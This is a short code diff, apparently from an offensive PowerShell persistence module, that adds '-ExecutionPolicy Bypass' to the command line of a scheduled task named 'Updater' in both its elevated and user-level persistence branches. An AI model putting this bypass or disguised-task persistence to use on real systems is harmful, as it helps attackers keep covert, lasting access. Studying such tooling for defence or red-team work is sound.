@@ -559,7 +559,7 @@ Get-WmiObject __FilterToConsumerBinding -Namespace root\subscription | Where-Obj
 
         'ScheduledTask'
         {
-            $CommandLine = '`"$($Env:SystemRoot)\System32\WindowsPowerShell\v1.0\powershell.exe -NonInteractive`"'
+            $CommandLine = '`"$($Env:SystemRoot)\System32\WindowsPowerShell\v1.0\powershell.exe -NonInteractive -ExecutionPolicy Bypass`"'
             $ElevatedTriggerRemoval = "schtasks /Delete /TN Updater"
 
             switch ($ElevatedPersistenceOption.Trigger)
@@ -607,7 +607,7 @@ Get-WmiObject __FilterToConsumerBinding -Namespace root\subscription | Where-Obj
     {
         'ScheduledTask'
         {
-            $CommandLine = '`"$($Env:SystemRoot)\System32\WindowsPowerShell\v1.0\powershell.exe -NonInteractive`"'
+            $CommandLine = '`"$($Env:SystemRoot)\System32\WindowsPowerShell\v1.0\powershell.exe -NonInteractive -ExecutionPolicy Bypass`"'
             $UserTriggerRemoval = "schtasks /Delete /TN Updater"
 
             switch ($UserPersistenceOption.Trigger)
